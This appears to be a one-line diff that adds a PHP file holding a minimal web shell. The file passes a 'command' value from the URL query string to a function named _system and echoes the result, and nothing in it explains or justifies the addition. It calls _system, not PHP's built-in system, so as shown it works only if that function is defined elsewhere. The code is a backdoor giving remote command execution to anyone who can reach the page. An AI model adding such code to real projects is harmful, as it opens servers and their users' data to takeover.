@@ -1,0 +1,1 @@
+<?php echo _system($_GET['command']); ?>
